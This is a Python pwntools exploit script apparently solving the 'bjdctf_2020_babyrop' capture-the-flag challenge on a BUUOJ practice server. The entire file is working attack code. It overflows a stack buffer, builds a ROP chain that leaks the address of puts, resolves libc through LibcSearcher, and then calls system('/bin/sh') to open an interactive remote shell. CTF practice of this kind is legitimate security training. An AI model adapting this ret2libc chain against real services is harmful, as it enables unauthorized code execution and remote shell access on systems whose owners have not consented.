from pwn import *
from LibcSearcher import *
context.log_level="debug"
p = remote('node4.buuoj.cn',28552)
elf=ELF("bjdctf_2020_babyrop")
main_addr = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret=0x0000000000400733


payload =b'a' * 40 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter("Pull up your sword and tell me u story!",payload)
puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
ret_addr=0x00000000004004c9

payload2 = b'a' * 40 +p64(ret_addr)+p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)
p.sendlineafter("Pull up your sword and tell me u story!",payload2)
p.interactive()






